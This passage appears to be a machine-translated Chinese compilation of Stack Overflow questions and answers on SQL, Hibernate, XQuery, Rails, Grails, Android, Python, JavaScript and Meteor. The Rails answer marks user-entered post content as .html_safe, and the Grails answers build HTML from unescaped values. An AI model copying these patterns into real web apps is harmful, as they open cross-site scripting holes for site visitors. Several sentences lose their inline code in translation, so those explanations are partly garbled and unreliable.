*   日期 == '2013-01-02 00:00:00'

**表相关新闻**

*   RelNewsId == 1
*   新闻 ID == 1
*   PortalId == 1

*   RelNewsId == 2

*   新闻 ID == 1
*   PortalId == 2

*   RelNewsId == 3

*   新闻 ID == 2
*   PortalId == 1

*   RelNewsId == 4

*   新闻 ID == 3
*   PortalId == 3

该数据应带来：

RelNewsId == **2** ; RelNewsId == **3** ; RelNewsId == **4** ;

* * *

我可以用这段代码得到我想要的结果：

```
Select top 1 relNews.PortalId, news.NewsId, news.date
from news
left join relNews on relNews.NewsId= news.NewsId
where relNews.PortalId == 1
group by relNews.PortalId, news.NewsId
order by news.date desc
UNION
Select top 1 relNews.PortalId, news.NewsId, news.date
from news
left join relNews on relNews.NewsId= news.NewsId
where relNews.PortalId == 2
group by relNews.PortalId, news.NewsId
order by news.date desc
UNION
Select top 1 relNews.PortalId, news.NewsId, news.date
from news
left join relNews on relNews.NewsId= news.NewsId
where relNews.PortalId == 3
group by relNews.PortalId, news.NewsId
order by news.date desc 
```

然后我得到所有 3 个结果。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T19:46:16.650

当一行可能有多个时，您必须提供某种方式来指示您想要哪一*行*。正如您所发现的，当您有一列可以为每个父级包含多个值时，您就会获得多行。有几种方法可以做到这一点。由于您使用的是 SQL Server 2008，因此您有多种选择。`news``relNews``GROUP BY`

1.  **CROSS/OUTER APPLY** -如果您想在没有匹配行时排除行，请将 更改`OUTER APPLY`为。`CROSS APPLY``relNews``News`

    ```
    SELECT
       R.Whatever,
       N.Whatever
    FROM
       dbo.relNews R
       OUTER APPLY (
          SELECT TOP 1 *
          FROM dbo.News N
          WHERE R.newsId = N.Id
          ORDER BY N.newsDate DESC
       ) N 
    ```

2.  **行数（）**

    ```
    SELECT
       R.Whatever,
       N.Whatever
    FROM
       dbo.RelNews R
       LEFT JOIN
          (
             SELECT
                *,
                Selector = Row_Number()
                   OVER (PARTITION BY N.Id ORDER BY N.newsDate DESC),
             FROM dbo.News N
          ) N ON R.newsId = N.Id
          AND N.Selector = 1 
    ```

3.  **聚合**- 这比它看起来需要的要复杂，但我认为这`newsDate`不是唯一的`newsID`。如果它*是*唯一的，那么它就更简单了。此版本适用于 SQL 2000。这也可能是我提供的所有选项中性能最差的查询。请注意，这`UniqueColumn`是任何具有保证唯一值的列，`newsID`并且可用于在关系中进行选择`newsDate`。

    ```
    SELECT
       R.Whatever,
       N.Whatever
    FROM
       dbo.RelNews R
       LEFT JOIN (
          dbo.News N
          INNER JOIN (
             SELECT N.Id, MaxUnique = Max(UniqueColumn)
             FROM
                dbo.News N
                INNER JOIN (
                   SELECT N.Id, MaxDate = Max(N.newsDate)
                   FROM dbo.News N
                   GROUP BY N.Id
                ) X ON N.Id = X.Id
                AND N.newsDate = X.MaxDate
             GROUP BY N.Id
          ) X ON N.Id = X.Id
          AND X.UniqueColumn = X.MaxUnique
       ) ON R.newsId = N.Id 
    ```

    如果`newsDate`真的是独一无二的，`news.Id`那么这里就是那个查询：

    ```
    SELECT
       R.Whatever,
       N.Whatever
    FROM
       dbo.RelNews R
       LEFT JOIN (
          dbo.News N
          INNER JOIN (
             SELECT N.Id, MaxDate = Max(N.newsDate)
             FROM dbo.News N
             GROUP BY N.Id
          ) X ON N.Id = X.Id
          AND N.newsDate = X.MaxDate
       ) ON R.newsId = N.Id 
    ```

4.  **子查询**- 问题是您一次只能拉一列，但可以在 SQL 2000 中工作，并且应该在适当的索引下表现良好。对于多个列可能会表现不佳，因为它可能会为每个列执行单独的查询。

    ```
    SELECT
       R.Whatever,
       NWhatever = (
          SELECT TOP 1 N.Whatever
          FROM dbo.News N
          WHERE R.newsId = N.Id
          ORDER BY N.newsDate DESC
       )
    FROM
       dbo.relNews R 
    ```

5.  **ON 子句中的子查询**- 如果您要提取多个列，这可能是 SQL 2000 的最佳查询。必须两次访问 News 表，但使用适当的索引应该不会那么糟糕。请注意，这`UniqueColumn`是任何具有保证唯一值的列，`newsID`并且可用于在关系中进行选择`newsDate`。

    ```
    SELECT
       R.Whatever,
       N.Whatever
    FROM
       dbo.relNews R
       LEFT JOIN dbo.News N
          ON R.newsId = N.Id
             -- above condition not absolutely required logically,
             -- but definitely for indexes
          AND N.UniqueColumn = (
             SELECT TOP 1 N.UniqueColumn
             FROM dbo.News N
             WHERE R.newsId = N.Id
             ORDER BY N.newsDate DESC
          ) 
    ```

6.  **Logical-Last - SQL 2000 的另一个可能表现良好的查询。这是与**[fo_x86](https://stackoverflow.com/a/14074852/57611)相同的逻辑查询，但表达方式略有不同。

    ```
    SELECT
       R.Whatever,
       N.Whatever
    FROM
       dbo.relNews R
       LEFT JOIN dbo.News N
          ON R.newsId = N.Id
          AND NOT EXISTS (
             SELECT *
             FROM dbo.News X
             WHERE
                N.Id = X.Id
                AND (
                   N.newsDate < X.newsDate
                   OR (
                      N.newsDate = X.newsDate
                      AND N.UniqueColumn < X.UniqueColumn
                   )
                )
          ) 
    ```

在您使用的数据库版本中，选项 #1 可能是最适合您的。

最后一点：与往常一样，**需要进行测试**。所有这些不同查询的性能将取决于很多因素：数据的模式（每个新闻项目的多个日期或少数几个）、确切的索引、表的宽度以及是否添加额外的条件（例如，如果您在外部`relNews`表上的条件仅返回几行，那么我建议的第一行将不会做得很好）。如果您发现一个查询没有提供令人满意的执行时间，请尝试另一个查询。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T19:42:46.900

假设 newsid 是按顺序创建的，并且“news”是一个“item”，那么您可能需要以下内容：

```
Select relNews.PortalId, max(relnews.newsid) as MostRecentNews
from relNews
group by relNews.PortalId 
```

如果您只想要 id，则不需要加入。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T19:43:51.017

您将按日期对门户 ID 进行排名

```
 select relNews.PortalId
 from news
 left join relNews on relNews.newsId = news.Id
 -- select rows for which there is no greater date than this row's date
 left outer join relNews2 on relNews.newsId = relNews2.newsId and relNews.date < relNews2.date
 where relNews2.PortalId is null
 group by relNews.PortalId, relNews.newsId 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-28T21:16:47.970

具有最高性能的最简单和最短的方法也是使用 ROW_NUMBER() Over(Partition by ...) 如下：

```
SELECT TOP 20 News.*, 
ROW_NUMBER() Over(Partition by relNews.PortalId Order By news.Id DESC ) R
FROM news LEFT JOIN relNews on relNews.newsId = news.Id
ORDER BY R 
```

我在这里使用前 20 个，因为这些是显示每个 Portal 中第一个新闻的 Portal 计数。

这是展示和表达“Partition By”用法的最佳示例

# java - Java Hibernate：Session.get 从不返回结果

> ID：14074746
> 
> 赞同：0
> 
> 时间：2012-12-28T19:36:18.487
> 
> 标签：java, hibernate

我只是在学习如何使用 Hibernate 进行数据库建模/映射。我正在使用以下代码片段来获取用户模型。

```
Session session = HibernateUtil.getSessionFactory().openSession();
User user = (User) session.get(User.class, id);
session.close(); 
```

用户的配置文件如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE hibernate-mapping PUBLIC "-//Hibernate/Hibernate Mapping DTD 2.0//EN" "http://hibernate.sourceforge.net/hibernate-mapping-2.0.dtd">

<hibernate-mapping>
    <class name="c3.data.User">
            <id name="id" type="java.lang.Integer">
                    <generator class="identity"/>
            </id>
            <property name="username" type="java.lang.String"/>
            <property name="password" type="java.lang.String"/>
            <property name="email" type="java.lang.String"/>
            <property name="salt" type="java.lang.String"/>

            <one-to-one name="authSession" property-ref="user" class="c3.data.AuthSession"/>
            <set name="projects" inverse="true">
                    <key column="projectLeadId"/>
                    <one-to-many class="c3.data.Project"/>
            </set>
    </class>
</hibernate-mapping> 
```

如您所见，它与称为 AuthSession 和 Project 的其他模型有关系。如有必要，我可以发布他们的配置文件。

我遇到的问题是当我调用 Session.get() 时，它永远不会返回；它只是挂起。Hibernate 向我展示了查询，它为用户、AuthSession 和项目运行查询。除了没有确认参数的值之外，查询看起来是正确的。在查询项目之后，没有任何反应。我在调用 get 之后立即放置了一个 print 语句，但它永远不会被打印出来。

我不知道还有什么要检查的，看看可能出了什么问题。有什么想法吗？

**编辑：** 有一个例外，这是堆栈跟踪：

```
java.lang.NullPointerException
    at org.hibernate.persister.entity.AbstractEntityPersister.loadByUniqueKey(AbstractEntityPersister.java:2314)
    at org.hibernate.type.EntityType.loadByUniqueKey(EntityType.java:664)
    at org.hibernate.type.EntityType.resolve(EntityType.java:444)
    at org.hibernate.engine.internal.TwoPhaseLoad.doInitializeEntity(TwoPhaseLoad.java:168)
    at org.hibernate.engine.internal.TwoPhaseLoad.initializeEntity(TwoPhaseLoad.java:134)
    at org.hibernate.loader.Loader.initializeEntitiesAndCollections(Loader.java:999)
    at org.hibernate.loader.Loader.doQuery(Loader.java:878)
    at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:293)
    at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:263)
    at org.hibernate.loader.Loader.loadCollection(Loader.java:2094)
    at org.hibernate.loader.collection.CollectionLoader.initialize(CollectionLoader.java:61)
    at org.hibernate.persister.collection.AbstractCollectionPersister.initialize(AbstractCollectionPersister.java:678)
    at org.hibernate.event.internal.DefaultInitializeCollectionEventListener.onInitializeCollection(DefaultInitializeCollectionEventListener.java:82)
    at org.hibernate.internal.SessionImpl.initializeCollection(SessionImpl.java:1801)
    at org.hibernate.collection.internal.AbstractPersistentCollection.forceInitialization(AbstractPersistentCollection.java:661)
    at org.hibernate.engine.internal.StatefulPersistenceContext.initializeNonLazyCollections(StatefulPersistenceContext.java:1014)
    at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:298)
    at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:263)
    at org.hibernate.loader.Loader.loadEntity(Loader.java:1977)
    at org.hibernate.loader.entity.AbstractEntityLoader.load(AbstractEntityLoader.java:82)
    at org.hibernate.loader.entity.AbstractEntityLoader.load(AbstractEntityLoader.java:72)
    at org.hibernate.persister.entity.AbstractEntityPersister.load(AbstractEntityPersister.java:3821)
    at org.hibernate.event.internal.DefaultLoadEventListener.loadFromDatasource(DefaultLoadEventListener.java:458)
    at org.hibernate.event.internal.DefaultLoadEventListener.doLoad(DefaultLoadEventListener.java:427)
    at org.hibernate.event.internal.DefaultLoadEventListener.load(DefaultLoadEventListener.java:204)
    at org.hibernate.event.internal.DefaultLoadEventListener.proxyOrLoad(DefaultLoadEventListener.java:260)
    at org.hibernate.event.internal.DefaultLoadEventListener.onLoad(DefaultLoadEventListener.java:148)
    at org.hibernate.internal.SessionImpl.fireLoad(SessionImpl.java:1075)
    at org.hibernate.internal.SessionImpl.access$2000(SessionImpl.java:175)
    at org.hibernate.internal.SessionImpl$IdentifierLoadAccessImpl.load(SessionImpl.java:2421)
    at org.hibernate.internal.SessionImpl.get(SessionImpl.java:971)
    at c3.data.UserManager.getUser(UserManager.java:22)
    at c3.data.AuthSessionManager.sessionExists(AuthSessionManager.java:14)
    at c3.console.Server.logon(Server.java:289)
    at c3.console.Server.onToken(Server.java:242)
    at tokenwebsocket.server.TokenWebSocketServer.onMessage(TokenWebSocketServer.java:37)
    at org.java_websocket.server.WebSocketServer.onWebsocketMessage(WebSocketServer.java:457)
    at org.java_websocket.WebSocketImpl.deliverMessage(WebSocketImpl.java:561)
    at org.java_websocket.WebSocketImpl.decodeFrames(WebSocketImpl.java:328)
    at org.java_websocket.WebSocketImpl.decode(WebSocketImpl.java:149)
    at org.java_websocket.server.WebSocketServer$WebSocketWorker.run(WebSocketServer.java:593) 
```

# xml - 通过处理异构 XML 树的 xQuery 输出

> ID：14074749
> 
> 赞同：1
> 
> 时间：2012-12-28T19:36:30.323
> 
> 标签：xml, xquery

我尝试使用 xQuery 处理多个 XML 文件（到目前为止经验非常有限）。XML 的重要部分可以这样表示：

```
<?xml version="1.0" encoding="UTF-8"?>
<ZOO xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

<Mammals>
<marsupials>
    <zoo>
        <kangaroo>
        <number>25</number>
            <red_kangaroo>
                <number>1</number>
            </red_kangaroo>
        </kangaroo>
    </zoo>
</marsupials>

<ruminants>
    <giraffe>
        <number>10</number>
        <comments>Comment Text.</comments>
    </giraffe>
    <antelope>
        <number>20</number>
        <comments>Comment Text.</comments>
    </antelope>
    <elk>
        <number>2</number>
        <comments>Comment Text.</comments>
    </elk>
    <mouflon>
        <number>3</number>
        <comments>Comment Text.</comments>
    </mouflon>
    <ibex>
        <number>2</number>
        <comments>Comment Text.</comments>
    </ibex>
    <ox>
        <number>5</number>
        <comments>Comment Text.</comments>
    </ox>
    <other_ruminants>
        <other_ruminant>
            <name>bison</name>
            <number>1</number>
            <comments>Comment Text.</comments>
        </other_ruminant>
        <other_ruminant>
            <name>musk ox</name>
            <number>2</number>
            <comments>Comment Text.</comments>
        </other_ruminant>
    </other_ruminants>
</ruminants>

<rodents>
    <rodent>
        <name>hamster</name>
        <number>10</number>
    </rodent>
    <rodent>
        <name>squirrel</name>
        <number>15</number>
        <comments>Comment Text.</comments>
    </rodent>
    <rodent>
        <other_rodent>
            <other_rodent_name>porcupine</other_rodent_name>
            <comment>Comment Text.</comment>
        </other_rodent>
        <number>1</number>
    </rodent>
    <rodent>
        <other_rodent>
            <other_rodent_name>beaver</other_rodent_name>
            <comment>Comment Text.</comment>
        </other_rodent>
        <number>2</number>
    </rodent>
</rodents>
</Mammals>

</ZOO> 
```

如您所见，有袋动物和大多数反刍动物都有自己的标签。然而，啮齿动物只有标签`<rodent>`，它们在标签内命名`<name>`，每个文件中有不同的啮齿动物。

我对文件进行审计的尝试如下所示（我使用 BaseX 7.5 工作）：

```
for $z in /ZOO, $m in $z/Mammals
return
<count>
<!-- file_id comes here later -->
<kangaroo>'{$z//kangaroo/number/text()}'</kangaroo>
<giraffe>'{$z//giraffe/number/text()}'</giraffe>
</count> 
```

...但我当然不能用啮齿动物来做这件事，因为不同的啮齿动物的数量和它们的名字在不同的文件中是不同的。所需的输出将是（对于显示的文件片段）：

```
<count>
 <!-- file_id comes here later -->
 <kangaroo>'25'</kangaroo>
 <giraffe>'10'</giraffe>
 <!-- other animals with own tags come here - antelope, mouflon etc. -->
 <!-- the problems begins here: how to output the rodents in the same way: -->
 <hamster>'10'</hamster>
 <squirrel>'15'</squirrel>
 <!-- the "other rodents" is the next story, but perhaps the solution could be similar? -->
</count> 
```

是否可以？您的帮助将不胜感激！

**更新：**换句话说：我怎么能输出没有自己标签的项目（啮齿动物没有，而大多数反刍动物都有）并且在不同的文件中数量不同？

**更新 2：**与此同时，我继续自己尝试，这就是我现在所拥有的：

查询（只有袋鼠、长颈鹿和啮齿动物是有趣的）：

```
for $z in /ZOO, $m in $z/Mammals
return
<count>
<!-- file_id comes here later -->
<kangaroo>{$z//kangaroo/number/text()}</kangaroo>
<giraffe>{$z//giraffe/number/text()}</giraffe>
 { for $r in $m//rodent
  return 
  if ( $r//name/text() ) then
  <sp>{$r//name/text()};{$r//number/text()}</sp>
    else 
  <sp>{$r//other_rodent_name/text()};{$r//number/text()}</sp>
 }
</count> 
```

实际输出：

```
 <count>
  <!-- file_id comes here later -->
  <kangaroo>25</kangaroo>
  <giraffe>10</giraffe>
  <sp>hamster;10</sp>
  <sp>squirrel;15</sp>
  <sp>porcupine;1</sp>
  <sp>beaver;2</sp>
 </count> 
```

也就是说，我*可以*以某种方式输出带有相应数字的啮齿动物（仓鼠、松鼠、豪猪和海狸）作为一种解决方法，我*可以*稍后编辑输出......但是我希望标签以啮齿动物动态命名，例如这边走：

```
 <count>
  <!-- file_id comes here later -->
  <kangaroo>25</kangaroo>
  <giraffe>10</giraffe>
  <hamster>10</hamster>
  <squirrel>15</squirrel>
  <porcupine>1</porcupine>
  <beaver>2</beaver>
 </count> 
```

或者（不太可取）以这种方式输出：

```
 <count>
  <!-- file_id comes here later -->
  <kangaroo>25</kangaroo>
  <giraffe>10</giraffe>
    <sp>
     <name>hamster</name>
     <number>10</number>
    </sp>
    <sp>
      <name>squirrel</name>
      <number>15</number>
    </sp>
    <sp>
      <name>porcupine</name>
      <number>1</number>
    </sp>
    <sp>    
      <name>beaver</name>
      <number>2</number>
    </sp>
 </count> 
```

我如何使用 xQuery 实现这一点？

**更新 3**（以及今晚的最后一次更新 :-)）：如果我脱离 xml 输出并使用 csv 输出，看来我现在有了解决方案。

查询：

```
 let $nl := "&#10;"
 for $z in /ZOO, $m in $z/Mammals
 return
 (
  string(
   concat
   (
     'kangaroo', ';', $m//kangaroo/number/text(),$nl,
     'giraffe', ';', $m//giraffe/number/text(), $nl
  )),

 for $r in $m//rodent
 return
 ( 
 if ( $r//name/text() ) then
 string( concat( $r//name/text(), ';', $r//number/text(), $nl ) )
 else
 string( concat( $r//other_rodent_name/text(), ';', $r//number/text(), $nl ) )
 )
 ) 
```

和输出：

```
 kangaroo;25
 giraffe;10
  hamster;10
  squirrel;15
  porcupine;1
  beaver;2 
```

可以很容易地进一步处理。

这里有一个新的小问题：缩进从哪里来？非常感谢您的时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-12-13T21:35:18.327

在 XML 中识别“动物”的唯一方法是数字元素的存在。

```
/ZOO//*[number] 
```

一旦我们选择了一种动物，我们就可以使用这种方法来获得它的名字：

```
if (fn:exists($animal/name))
then $animal/name/fn:string(.)
else
  if (fn:exists($animal/other_rodent))
  then $animal/other_rodent/other_rodent_name/fn:string(.)
  else fn:local-name($animal) 
```

添加元素构造函数并用联合和序列操作替换嵌套条件为我们提供了一个完整的示例：

```
element count {
  for $animal in /ZOO//*[number]
  let $name :=
    ( $animal/(name|other_rodent/other_rodent_name)/text(),
      fn:local-name($animal) )[1]
  let $number := $animal/number/fn:string(.)
  return
    element { fn:replace($name, " ", "_") } {
      fn:concat("'", fn:concat($number, "'"))
    }
} 
```

# ruby-on-rails - 如何在 rails text_area 字段中允许多行内容？

> ID：14074750
> 
> 赞同：8
> 
> 时间：2012-12-28T19:36:31.140
> 
> 标签：ruby-on-rails, ruby-on-rails-3.1

我将如何允许用户在`text_area`表单字段中输入多行文本？

目前`text area`，只要在换行符中输入内容就会被删除......当我编辑内容时它们会被保留......所以，也许是在显示视图中删除了换行符？

我发现一些事情表明我需要实现所见即所得的编辑器，但如果可能的话，我宁愿避免这种情况。

有什么建议么？

**更新：**所以，看起来 rails 使用换行符保存内容，我可以添加`.html_safe`到显示视图中的字段（即`<%= @post.post.html_safe %>`）。现在它将显示带有基本 html 的内容（例如`<br>`，`<b>`等...），但仍然不显示由 rails 保存的内容中的换行符（即当我按 enter 换行时），我可以查看何时我正在编辑内容。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-28T20:03:32.683

换行符不在 HTML 中呈现。您将需要在内容上使用[simple_format](http://api.rubyonrails.org/classes/ActionView/Helpers/TextHelper.html#method-i-simple_format)或[wraptext 之](https://github.com/cheald/wraptext)类的东西，因为您将其回显以将换行符转换为`<br>`或`<p>`标记。

```
<%=simple_format(@post.post).html_safe %> 
```

或者

```
<%=Wraptext::Parser.new(@post.post).to_html.html_safe %> 
```

# grails - 有没有办法在 Grails 中将地图呈现为 HTML 表格？

> ID：14074758
> 
> 赞同：2
> 
> 时间：2012-12-28T19:36:54.090
> 
> 标签：grails

我想知道是否有一种很好的方法可以将 a 呈现`Map`到页面内的 HTML 表格中`.gsp`。

一个例子`Map`：

```
def map = ['Mammals':['Unicorn','Chimpanzee','Goat'],
                   'Reptiles':['Snake','Turtle']]; 
```

这将呈现如下内容：

```
<table>
  <thead>
    <tr>
      <th>Mammals</th>
      <th>Reptiles</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Unicorn</td>
      <td>Snake</td>
    </tr>
    <tr>
      <td>Chimpanzee</td>
      <td>Turtle</td>
    </tr>
   <tr>
      <td>Goat</td>
      <td></td>
    </tr>
  </tbody>
</table> 
```

理想情况下，我可以创建自己的自定义标签，所以我可以这样做：

```
<stackOverflow:tablizer map="${map}" /> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T20:13:51.067

像这样的东西 - 可能是一种更好的方法，但这是我首先想到的。

```
def mapToTable = { attrs ->

StringBuilder output = new StringBuilder()

if ( attrs.map instanceof Map )
{ 
    Map map = attrs.map

    if ( map.size() > 0 )
    {
        output.append("<table><thead><tr>")

        ArrayList[] values = map.values()

        int max = values.collect{it.size()}.max()

        map.each { key, val ->
            output.append("<th>${key}</th>")
        }

        output.append("</tr></thead><tbody>")

        (1..max).each { num ->
            output.append("<tr>")

            values.each {

                if ( it.size() >= num  )
                {
                    output.append("<td>${it.get(num-1)}</td>")    
                }
                else
                {
                    output.append("<td></td>")   
                }
            }    

            output.append("</tr>")
        }

        output.append("</tbody></table>")
    }

}
out << output
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-26T17:04:44.787

我无法评论@James Kleeh 的回答，但我修改了他的代码以打印地图列表，例如您从 Groovy Sql 结果中返回的内容：

```
protected String mapToTable(List<Map> list) {

    StringBuilder output = new StringBuilder()

    Map first = list.first()

    output.append("<table><thead><tr>")

    first.each { key, val ->
        output.append("<th>${key}</th>")
    }

    output.append("</tr></thead><tbody>")

    list.each { map ->
        if (map.size() > 0) {

            def values = map.values()

            output.append("<tr>")

            values.each {
                output.append "<td>${it}</td>"
            }

            output.append("</tr>")
        }
    }
    output.append("</tbody></table>")

    output.toString()
} 
```

# unit-testing - 覆盖 Grails GORM 域类上的事件关闭以进行单元测试

> ID：14074761
> 
> 赞同：4
> 
> 时间：2012-12-28T19:37:06.447
> 
> 标签：unit-testing, grails, groovy, grails-orm, expandometaclass

我正在开发一个新的 Grails 项目，最近注意到 Spring Security Core 生成的 User 类中的默认约定现在通过 beforeInsert/Update 事件自动编码密码。这是一种很好的、​​干净的、干燥的编码方式，也让人不可能忘记这样做。

但是，现在当尝试编写一些使用所述 User 类的单元测试时，我发现我要么必须模拟 springSecurityService （由于编码），或者更优选地（并且干净地），我只是覆盖beforeInsert/Update 闭包，其中一个什么都不做。通常在 Groovy 中，可以使用 ExpandoMetaClass 覆盖方法，阿拉...

```
User.metaClass.beforeInsert = { /* do nothing */ } 
```

...但我发现在创建和保存新用户时继续调用原始的 beforeInsert。这反过来又导致我的单元测试崩溃。解决这个问题并模拟服务对我来说是微不足道的，但上面***应该可以工作***。我错过了什么吗？GORM 的事件关闭有什么不同我没有接受的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-06-20T07:24:02.307

为了提高性能，Grails 直接使用反射和缓存方法句柄来调用事件，而不是 Groovy 的元层。原因是，如果您要保存数百个域实例，如果 Grails 必须为每个事件都通过 Groovy 的元层，则会严重影响性能。

有一些方法可以解决这个问题，例如定义您自己的`User`类，该类根据您的测试设置的系统/环境属性禁用事件等，但目前无法通过元编程覆盖这些方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-29T10:20:24.683

闭包实际上不仅是 toString() 或 save()之`beforeInsert`类的方法，而且是[Gorm](http://grails.org/doc/latest/guide/GORM.html#eventsAutoTimestamping)支持的预定义事件。覆盖该方法不会阻止 Gorm 触发 PreInsert 事件，这会导致原始进程。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-10-06T22:59:06.167

如有必要，您可以将 中的代码替换为`beforeInsert`私有方法，然后覆盖私有方法

# java - 空指针异常

> ID：14074762
> 
> 赞同：-3
> 
> 时间：2012-12-28T19:37:10.567
> 
> 标签：java, android

我正在尝试从电话中的联系人中选择显示名称、手机号码，并使用列表视图将这些显示在列表中。但是在运行以下代码时出现空指针异常：

```
public class SeeActivity extends ListActivity {
    public String [] allname;
       public String [] allnumber;
       public int listcount=0;
       public String [] details;
       String[] PROJECTION = new String[] {
               ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
               ContactsContract.CommonDataKinds.Phone.NUMBER

       };
      @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

;

        Cursor phone= getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,PROJECTION ,null ,null ,null);

       try{
        while(phone.moveToNext())
        {  

           String name= phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
           String number=phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
           allname[listcount]=name;
           allnumber[listcount]=number;
           details [listcount]=name+"    "+number;
           listcount=listcount+1;

        }
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
                android.R.layout.simple_list_item_1,details);
        setListAdapter(adapter);
        ListView l=getListView();
           l.setOnItemClickListener(new OnItemClickListener() {

            public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
                    long arg3) {
                Toast.makeText(getApplicationContext(),((TextView)arg1).getText() , Toast.LENGTH_SHORT).show();

           }
        });}
       catch( Exception e)
       {
           Toast.makeText(getApplicationContext(),e.toString(),Toast.LENGTH_LONG).show();   
       }

    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:39:23.480

问题是您已经声明了 String 数组，但尚未为它们创建/分配内存：

```
public String [] allname;
public String [] allnumber;
public int listcount=0;
public String [] details; 
```

因此，当您尝试访问它们时：

```
allname[listcount]=name;
allnumber[listcount]=number;
details [listcount]=name+" "+number; 
```

它给出了空指针异常。因此，在声明它们的同时创建您的 String 数组：

```
public String[] allname = new String[100];
public String[] allnumber = new String[100];
public int listcount = 0;
public String[] details = new String[100]; 
```

看看[数组](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/arrays.html)

* * *

并且不要忘记关闭光标。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:38:41.683

```
 public String [] allname;
    public String [] allnumber; 
```

指向`null`; 和以下分配结果`NullPointerException`。

```
 allname[listcount]=name;
       allnumber[listcount]=number; 
```

更改数组创建语句，例如：

```
public String[] allname = new String[10];
public String[] allnumber = new String[10]; 
```

如果您不提前知道大小，我建议您使用类似的东西`ArrayList`而不是数组。

# python - 将变量与列表匹配并保存匹配

> ID：14074763
> 
> 赞同：0
> 
> 时间：2012-12-28T19:37:20.407
> 
> 标签：python

新手问题，我有以下代码，我需要将变量 gerrit 中的数据与列表 gerrit_refs 匹配并获取相应的匹配并保存在变量中，我该怎么做？

```
'''
gerrit_refs:
refs/changes/89/202089/4
refs/changes/39/205739/2
refs/changes/94/195594/6
refs/changes/90/202090/4
refs/changes/92/202092/4
'''

def main ():
    gerrit=205739
    with open('gerrit_refs.txt', 'r') as f:
        # Here we make a list of refs based on the file
        gerrit_refs = [line.strip() for line in f]
    match = None
    for ref in gerrit_refs:
        if gerrit in ref:
            match = ref
            print match
            break

if __name__ == '__main__':
    main() 
```

错误：-

TypeError: 'in' 需要字符串作为左操作数，而不是 in

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:48:53.667

过滤掉列表理解中的匹配行：

```
def main ():
    gerrit = 205739
    gerrit_str = str(gerrit)
    with open('gerrit_refs.txt', 'rb') as f:
        # Here we make a list of refs based on the file
        gerrit_refs = [line.strip() for line in f if gerrit_str in line]

    if gerrit_refs:
        # At least one match was found.
        print gerrit_refs 
```

注意需要将`gerrit`搜索变量更改为字符串。`in`运算符不适用于混合变量。

如果有多个引用，这将起作用，因为它返回一个列表。如果您只想获取第一个匹配项，则只需提取第一项：

```
if gerrit_refs:
    print "First match:", gerrit_refs[0] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T20:22:40.863

```
next((l.strip() for l in open('gerrit_refs.txt') if str(gerrit) in l), False) 
```

# javascript - javascript 没有正确地从循环中返回

> ID：14074765
> 
> 赞同：0
> 
> 时间：2012-12-28T19:37:21.407
> 
> 标签：javascript, jquery

> **可能重复：**
> [jQuery 每个方法不返回值](https://stackoverflow.com/questions/1900172/jquery-each-method-does-not-return-value)

似乎 return 语句不会中断循环并返回函数。以下代码一直返回 false....

```
var __in__ = function(elem, array){
    // $.each(array, function(index, item) {  
   array.forEach(function(index, item) {
        if (item == elem)
            return true;
    });
    return false;
};

console.log(__in__(3,[1,2,3])); 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-28T19:39:42.620

那是因为`$.each`它正在执行函数回调。`$.each`不是一个`for`循环。以下是您所追求的：

```
var __in__ = function(elem, array){
    var result = false;

    $.each(array, function(index, item) {
        if (item == elem) {
            result = true;
            return false;
        }
    });

    return result;
}; 
```

[http://jsfiddle.net/unByH/1/](http://jsfiddle.net/unByH/1/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-28T19:42:02.773

您的内部 return 语句仅从内部（嵌套）函数返回，外部 return 语句始终运行（即使在匹配时）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-28T19:43:14.993

尝试这个：

```
var __in__ = function(elem, array){
    var found = false;

    $.each(array, function(index, item) {
        if (item == elem) {
            found = true;
            return false; // break out of $.each call
        }
    });

    return found;
}; 
```

# javascript - 如何防止 Meteor 将集合中的所有文档发送给客户端？

> ID：14074769
> 
> 赞同：1
> 
> 时间：2012-12-28T19:37:56.570
> 
> 标签：javascript, meteor

使用 Meteor.subscribe() 时，如何关闭默认的“订阅集合的所有文档”行为？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:37:56.570

默认情况下，新的流星应用程序包含`autopublish`负责该行为的包。要阻止这种情况发生，请通过`meteor remove autopublish`在流星应用程序主目录中键入命令行来删除包。

有关详细信息，请参阅[http://docs.meteor.com/#dataandsecurity](http://docs.meteor.com/#dataandsecurity)：

